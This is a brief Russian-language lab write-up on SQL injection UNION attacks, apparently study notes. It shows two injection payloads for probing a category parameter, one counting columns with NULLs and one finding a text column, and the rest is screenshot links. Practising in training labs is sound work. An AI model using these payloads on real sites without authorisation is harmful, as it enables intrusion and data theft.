 Lab: SQL injection UNION attack, determining the number of columns returned by the query 
 
 Изменяем category, чтобы добавить дополнительный столбец, содержащий нулевое значение:'+UNION+SELECT+NULL,NULL--
 ![Image alt](https://github.com/Svizy/Prack-2020/blob/master/sql_union/lab_sql_un_1_1.PNG)
 ![Image alt](https://github.com/Svizy/Prack-2020/blob/master/sql_union/lab_sql_un_1_2.PNG)
 
 Lab: SQL injection UNION attack, finding a column containing text
 
 
Заменяем значение на '+UNION+SELECT+'abcdef',NULL,NULL--  , получаем ошибку:
 ![Image alt](https://github.com/Svizy/Prack-2020/blob/master/sql_union/lab_sql_un_2_3.PNG)
 ![Image alt](https://github.com/Svizy/Prack-2020/blob/master/sql_union/lab_sql_un_2_4.PNG)
 
 ![Image alt](https://github.com/Svizy/Prack-2020/blob/master/sql_union/lab_sql_un_3_1.PNG)
 ![Image alt](https://github.com/Svizy/Prack-2020/blob/master/sql_union/lab_sql_un_3_2.PNG)
 ![Image alt](https://github.com/Svizy/Prack-2020/blob/master/sql_union/lab_sql_un_3_3.PNG)
 ![Image alt](https://github.com/Svizy/Prack-2020/blob/master/sql_union/lab_sql_un_3_4.PNG)
 
 ![Image alt](https://github.com/Svizy/Prack-2020/blob/master/sql_union/lab_sql_un_4_1.PNG)
 ![Image alt](https://github.com/Svizy/Prack-2020/blob/master/sql_union/lab_sql_un_4_2.PNG)
 ![Image alt](https://github.com/Svizy/Prack-2020/blob/master/sql_union/lab_sql_un_4_3.PNG)
 ![Image alt](https://github.com/Svizy/Prack-2020/blob/master/sql_union/lab_sql_un_4_4.PNG)
 
